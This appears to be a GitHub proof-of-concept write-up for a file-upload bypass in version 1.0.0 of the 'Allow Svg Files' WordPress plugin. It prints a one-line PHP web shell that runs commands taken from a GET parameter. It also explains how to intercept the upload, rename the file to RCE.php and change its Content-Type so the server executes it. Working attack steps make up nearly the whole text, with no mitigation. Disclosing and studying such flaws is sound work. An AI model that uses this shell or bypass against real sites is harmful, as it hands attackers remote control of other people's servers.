# Bypass File Upload In "Allow Svg Files" WordPress-Plugin

This PoC describe how to exploit a Bypass File Upload in "Allow Svg Files" v1.0.0 to get a Remote Code Execution (RCE)

# Description

The "Allow Svg Files" v1.0.0 plugin for Wordpress does not properly handle the files that are sent to the server and because of that, we were able to perform a bypass file upload

![1](https://user-images.githubusercontent.com/70114276/166060325-e8294eac-d0b8-452d-b682-f02ded4f7e5b.png)

## Attack Scenario

First we create our SVG file with this content:

```
<?php
system($_GET[RCE]);
?>
```

After that we send an svg file and intercept the request with a proxy and change the filename parameter to "RCE.php" and the Content-Type to "text/plain"

![2](https://user-images.githubusercontent.com/70114276/166060473-d33ba4f9-3e00-46ef-b92e-c05310ace675.png)

after sending the file, just access it and get the RCE

![3](https://user-images.githubusercontent.com/70114276/166061037-c7cbf47d-8f81-4ff3-870d-981bbba11c15.png)

![4](https://user-images.githubusercontent.com/70114276/166061051-60f5b7e7-e3a0-4f25-aad8-81312b551d2d.png)
